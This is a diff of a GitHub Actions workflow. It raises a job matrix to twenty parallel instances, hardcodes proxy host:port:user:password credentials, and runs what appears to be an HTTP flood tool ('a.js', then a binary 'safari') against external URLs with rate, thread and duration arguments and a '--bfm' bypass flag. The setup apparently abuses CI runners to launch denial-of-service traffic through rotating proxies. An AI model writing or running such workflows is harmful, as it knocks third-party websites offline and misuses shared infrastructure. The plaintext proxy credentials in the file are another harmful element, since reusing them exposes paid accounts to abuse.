@@ -13,7 +13,7 @@ jobs:
     strategy:
       fail-fast: false
       matrix:
-        instance: [1,2,3,4]
+        instance: [1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20]
     steps:
     - name: Checkout code
       uses: actions/checkout@v4
@@ -31,18 +31,11 @@ jobs:
     - name: Create proxy file
       run: |
         cat > 11.txt << 'EOF'
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
-        proxy.global.ip2up.com:12348:KBpiET9-res-any:G1nk2M2
+        proxy.proxy4u.com:824:1dfdcc12b768af20c4a4__cr.us:484d40d865d779e8
+
         EOF
 
     - name: Run a.js (Instance ${{ matrix.instance }})
       run: |
-        node a.js GET https://xbossop.shop/login 700 1 1  11.txt --bfm --debug --auth
+        chmod +x *
+        ./safari https://ip.ipcount.org/ 700 1000 8000 11.txt --auth --cdn 
